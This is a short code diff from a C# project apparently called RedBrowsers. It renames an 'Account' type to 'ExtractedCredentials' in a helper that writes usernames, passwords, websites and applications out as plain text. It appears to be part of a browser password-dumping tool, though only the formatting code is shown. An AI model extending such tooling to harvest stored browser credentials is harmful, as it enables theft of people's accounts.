@@ -1,8 +1,8 @@
-﻿using RedBrowsers.Classes;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Reflection;
+
 namespace RedBrowsers.Utlis
 {
     class Utlis
@@ -39,10 +39,10 @@ namespace RedBrowsers.Utlis
                 CreateRows(list, sw);
             }
         }
-        public static string CreateString(List<Account> Accounts) 
+        public static string CreateString(List<ExtractedCredentials> Accounts) 
         {
             string ret =string.Empty;
-            foreach (Account account in Accounts)
+            foreach (ExtractedCredentials account in Accounts)
             {
                 ret += $"---------------------------------------------{Environment.NewLine}UserName    =  {account.UserName}{Environment.NewLine}PassWord    =  {account.Password}{Environment.NewLine}Website     =  {account.URL}{Environment.NewLine}Application =  {account.Application}{Environment.NewLine}---------------------------------------------";
             }
